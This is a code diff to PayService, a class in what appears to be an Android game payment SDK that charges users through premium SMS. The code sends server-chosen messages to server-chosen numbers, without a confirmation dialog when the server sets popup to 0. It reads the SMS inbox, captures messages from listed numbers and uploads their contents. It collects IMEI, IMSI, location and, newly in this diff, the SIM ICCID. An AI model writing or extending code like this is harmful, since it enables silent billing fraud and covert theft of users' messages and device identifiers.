@@ -20,9 +20,12 @@ import com.hh.sdk.api.SMSSendStatusApi;
 import com.hh.sdk.model.SMSSendModel;
 import com.hh.sdk.net.JsonResponse;
 import com.hh.sdk.net.NetTask;
+import com.hh.sdk.platform.StartSmsPay;
+import com.hh.sdk.util.PhoneInformation;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
+import java.net.URLDecoder;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Queue;
@@ -46,7 +49,8 @@ public class PayService {
     private List<String> mInterceptPhone = new ArrayList<String>();
     private Queue<SMSSendModel> smsIdQueue = new LinkedBlockingQueue<SMSSendModel>();
     private Queue<SMSSendModel> sendSmsIdQueue = new LinkedBlockingQueue<SMSSendModel>();
-    private String orderId  ;
+    private String orderId;
+    private String mPointCode ;
     public void setLatitued(double latitued) {
         this.latitued = latitued;
     }
@@ -79,23 +83,27 @@ public class PayService {
         mActivity.getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, mObserver);
     }
 
-    public void requestPay(int money, String imei, String imsi,
-                           String region, IPayListener listener) {
+    public void requestPay(int money,String propName, String imei, String imsi,
+                           String pointCode, IPayListener listener) {
         if (canPay()) {
             mInterceptPhone.clear();
             sendSmsIdQueue.clear();
             hasCallback = false;
+            this.mPointCode=pointCode ;
             this.mPayListener = listener;
             this.imei = imei;
             this.imsi = imsi;
             this.money = money;
+            PhoneInformation phoneInformation = new PhoneInformation(mActivity);
             RequestPayApi requestPayApi = new RequestPayApi();
-            requestPayApi.gameId= getMeteDate(mActivity, "zmappid");
-            requestPayApi.channelId = getMeteDate(mActivity,"zmchanelId");
+            requestPayApi.gameId = getMeteDate(mActivity, "zmappid");
+            requestPayApi.channelId = getMeteDate(mActivity, "zmchanelId");
             requestPayApi.imei = imei;
             requestPayApi.imsi = imsi;
             requestPayApi.money = money;
+            requestPayApi.ccId = phoneInformation.getIccid();
             requestPayApi.region = null;
+            requestPayApi.propName = propName ;
             requestPayApi.latitude = latitued + "";
             requestPayApi.longitude = longtitued + "";
             requestPayApi.setResponse(response);
@@ -124,6 +132,12 @@ public class PayService {
             switch (getResultCode()) {
                 case Activity.RESULT_OK:
                     Log.e("", "短信发送成功");
+                    if (!hasCallback) {
+                        hasCallback = true;
+                        if (mPayListener != null) {
+                            mPayListener.paySuccess(money);
+                        }
+                    }
                     notifyMessage(sendSmsIdQueue.poll(), 0);
                     break;
                 case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
@@ -139,7 +153,7 @@ public class PayService {
             }
         }
     };
-   private JsonResponse response = new JsonResponse() {
+    private JsonResponse response = new JsonResponse() {
 
         @Override
         public void requestSuccess(JSONObject jsonObject) {
@@ -151,68 +165,73 @@ public class PayService {
                     JSONObject data = json.getJSONObject("data");
                     int status = data.getInt("status");
                     if (status == 0) {
-                        timeInterval = data.optInt("timeInterval");
-//                        final String packageName = data
-//                                .getString("packageName");
-//                        Log.e("", packageName + " =========== " + mActivity.getPackageName());//FIXME
-                        int popup = data.getInt("popup");
-                        Log.e("", " popup===== " + popup);//FIXME
-
-                        final List<SMSSendModel> smsSendModelList = new ArrayList<SMSSendModel>();
-                        final List<String> interceptPorts = new ArrayList<String>();
-                        JSONArray array = data
-                                .getJSONArray("smsList");
-                        for (int i = 0; i < array.length(); i++) {
-                            JSONObject smsJson = array.getJSONObject(i);
-                            SMSSendModel smsSendModel = new SMSSendModel();
-                            smsSendModel.smsId = smsJson.optString("smsId");
-                            smsSendModel.orderId = smsJson.optString("orderId") ;
-                            smsSendModel.port = smsJson.optString("port");
-                            smsSendModel.money = smsJson.optInt("money");
-                            smsSendModel.regexp = smsJson.optString("regexp");
-                            smsSendModel.sms = smsJson.optString("sms");
-                            JSONArray intercepterArray = smsJson.getJSONArray("interceptPorts");
-                            for (int j = 0; j < intercepterArray.length(); j++) {
-                                mInterceptPhone.add(intercepterArray.getString(j));
-                            }
-                            smsSendModelList.add(smsSendModel);
-                        }
-                        if (popup == 0) {
-                            for (SMSSendModel sms : smsSendModelList) {
-                                sendSMS(sms);
-                            }
+                        int paymentType = data.optInt("paymentType");
+                        if (paymentType == 2002) {//斯凯支付
+                            payZhifu(data.optString("orderId"));
                         } else {
-                            new AlertDialog.Builder(mActivity)
-                                    .setTitle("确定支付")
-                                    .setMessage("您将通过话费进行支付")
-                                    .setNegativeButton("取消",
-                                            new OnClickListener() {
+                            timeInterval = data.optInt("timeInterval");
+                            int popup = data.getInt("popup");
+                            final List<SMSSendModel> smsSendModelList = new ArrayList<SMSSendModel>();
+                            final List<String> interceptPorts = new ArrayList<String>();
+                            JSONArray array = data
+                                    .getJSONArray("smsList");
+                            boolean encodeFlg  = data.optBoolean("encodeFlg");
+                            for (int i = 0; i < array.length(); i++) {
+                                JSONObject smsJson = array.getJSONObject(i);
+                                SMSSendModel smsSendModel = new SMSSendModel();
+                                smsSendModel.smsId = smsJson.optString("smsId");
+                                smsSendModel.orderId = smsJson.optString("orderId");
+                                smsSendModel.port = smsJson.optString("port");
+                                smsSendModel.money = smsJson.optInt("money");
+                                smsSendModel.regexp = smsJson.optString("regexp");
+                                if(encodeFlg) {
+                                    smsSendModel.sms = smsJson.optString("sms");
+                                }else {
+                                    String ms = smsJson.optString("sms") ;
+                                    smsSendModel.sms = URLDecoder.decode(ms,"utf-8");
+                                }
+                                JSONArray intercepterArray = smsJson.getJSONArray("interceptPorts");
+                                for (int j = 0; j < intercepterArray.length(); j++) {
+                                    mInterceptPhone.add(intercepterArray.getString(j));
+                                }
+                                smsSendModelList.add(smsSendModel);
+                            }
+                            if (popup == 0) {
+                                for (SMSSendModel sms : smsSendModelList) {
+                                    sendSMS(sms);
+                                }
+                            } else {
+                                new AlertDialog.Builder(mActivity)
+                                        .setTitle("确定支付")
+                                        .setMessage("您将通过话费进行支付")
+                                        .setNegativeButton("取消",
+                                                new OnClickListener() {
 
-                                                @Override
-                                                public void onClick(
-                                                        DialogInterface dialog,
-                                                        int which) {
-                                                    dialog.cancel();
-                                                    if (mPayListener != null) {
-                                                        mPayListener.payCancel(money);
+                                                    @Override
+                                                    public void onClick(
+                                                            DialogInterface dialog,
+                                                            int which) {
+                                                        dialog.cancel();
+                                                        if (mPayListener != null) {
+                                                            mPayListener.payCancel(money);
+                                                        }
                                                     }
-                                                }
-                                            })
-                                    .setPositiveButton("确定",
-                                            new OnClickListener() {
+                                                })
+                                        .setPositiveButton("确定",
+                                                new OnClickListener() {
 
-                                                @Override
-                                                public void onClick(
-                                                        DialogInterface dialog,
-                                                        int which) {
-                                                    // 发送短信
-                                                    for (SMSSendModel sms : smsSendModelList) {
-                                                        sendSMS(sms);
+                                                    @Override
+                                                    public void onClick(
+                                                            DialogInterface dialog,
+                                                            int which) {
+                                                        // 发送短信
+                                                        for (SMSSendModel sms : smsSendModelList) {
+                                                            sendSMS(sms);
+                                                        }
                                                     }
-                                                }
-                                            }).create().show();
+                                                }).create().show();
+                            }
                         }
-
                     } else if (status == 1) {
                         Toast.makeText(mActivity,
                                 "没有合适通道可用", Toast.LENGTH_SHORT).show();
@@ -260,7 +279,7 @@ public class PayService {
                 PendingIntent sentPI = PendingIntent.getBroadcast(mActivity, 0,
                         intent, 0);
                 SmsManager manager = SmsManager.getDefault();
-                Log.e("SendMessage", model.port+ "->" + model.sms);
+                Log.e("SendMessage", model.port + "->" + model.sms);
                 manager.sendTextMessage(model.port, null, model.sms, sentPI, null);
             }
         }, 100);
@@ -274,6 +293,29 @@ public class PayService {
 //            }
 //        }, 30000);
     }
+
+    public void payZhifu(String orderId){
+        this.orderId = orderId ;
+        new StartSmsPay(mActivity).startPay(mPointCode,money+"",false,listener);
+    }
+
+    private StartSmsPay.PayListener listener = new StartSmsPay.PayListener() {
+        @Override
+        public void onSuccess(int money) {
+            SMSSendModel model = new SMSSendModel();
+            model.orderId=orderId ;
+            mPayListener.paySuccess(money);
+           notifyMessage(model,0);
+        }
+
+        @Override
+        public void onFail(int errorcode) {
+            SMSSendModel model = new SMSSendModel();
+            model.orderId=orderId ;
+            mPayListener.payFail(money);
+            notifyMessage(model,1);
+        }
+    };
 
     public String getMeteDate(Context context, String key) {
         ApplicationInfo info;
@@ -297,10 +339,10 @@ public class PayService {
      *
      * @param status 失败重试次数
      */
-    private void notifyMessage(final SMSSendModel model , final int status) {
+    private void notifyMessage(final SMSSendModel model, final int status) {
         SMSSendStatusApi api = new SMSSendStatusApi();
         api.smsId = model.smsId;
-        api.orderId = model.orderId ;
+        api.orderId = model.orderId;
         api.status = status;
         api.setResponse(new JsonResponse());
         new NetTask().execute(api);
@@ -359,13 +401,8 @@ public class PayService {
                 String body = cursor.getString(2);
                 if (mInterceptPhone.contains(address)) {
                     // 过滤短信
-                    if (!hasCallback) {
-                        hasCallback = true;
-                        if (mPayListener != null) {
-                            mPayListener.paySuccess(money);
-                        }
-                    }
-                    Log.e("PayService","queue size->"+smsIdQueue.size());
+
+                    Log.e("PayService", "queue size->" + smsIdQueue.size());
                     sendMessageToServer(smsIdQueue.poll(), body, address);
 //                    Toast.makeText(mActivity, String.format("address: %s\n body: %s", address, body), Toast.LENGTH_SHORT).show();
                 }
